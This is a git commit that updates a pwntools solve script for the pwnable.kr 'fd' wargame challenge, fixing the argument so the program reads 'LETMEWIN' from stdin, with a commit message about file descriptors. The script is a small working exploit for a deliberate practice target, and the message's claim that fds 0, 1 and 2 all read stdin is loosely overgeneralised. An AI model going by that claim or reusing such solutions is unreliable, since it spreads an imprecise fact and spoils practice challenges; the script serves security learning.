565afbe8bedfe0229b5916507634b5f7727e9587
Jay Smith <jaysm17h@gmail.com>
2021-05-21 00:07:21 +0000

    Fix issue with pwnable.kr fd.
    I learned that if you read from fd 0 OR 1 OR 2, it will result in the
    same thing and read from stdin. Mind. Blown.

--- pwnable.kr/toddlers_bottle/fd/solve.py
+++ pwnable.kr/toddlers_bottle/fd/solve.py
@@ -2,8 +2,8 @@ from pwn import *
 
 session = ssh('fd', 'pwnable.kr', port=2222, password='guest')
 
-# stdin is fd 1. Our arg is reduced by 0x1234, so let's send 0x1235.
-arg1 = str(0x1235)
+# stdin is fd 0. Our arg is reduced by 0x1234, so let's send 0x1234.
+arg1 = str(0x1234)
 io = session.process(['./fd', arg1])
 io.sendline('LETMEWIN')
 io.recvuntil(':)\n')
